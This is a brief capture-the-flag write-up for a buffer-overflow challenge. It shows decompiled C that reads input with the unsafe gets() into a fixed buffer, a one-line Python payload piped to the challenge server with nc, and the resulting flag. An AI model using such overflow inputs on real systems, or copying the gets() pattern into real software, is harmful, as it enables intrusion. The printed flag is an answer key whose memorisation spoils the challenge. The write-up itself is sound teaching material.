## pwn intended 0x1
The main idea finding the flag is Buffer Overflow.

#### Step-1:
I reversed the file with Ghidra.

```c
undefined8 main(void)

{
  char local_38 [44];
  int local_c;

  local_c = 0;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Please pour me some coffee:");
  gets(local_38);
  puts("\nThanks!\n");
  if (local_c != 0) {
    puts("Oh no, you spilled some coffee on the floor! Use the flag to clean it.");
    system("cat flag.txt");
  }
  return 0;
}
```

#### Step-2:
Clearly, this was a case for Buffer Overflow.

A simple command to overflow the buffer would give us the flag.

`python -c 'print"A"*45' | nc chall.csivit.com 30001`

<i> The piping done other way round doesn't help though. </i>

Output:

```bash
Please pour me some coffee:

Thanks!

Oh no, you spilled some coffee on the floor! Use the flag to clean it.
csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
```

Voila! There we have our flag.

#### Step-3:
Finally the flag becomes:
`csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}`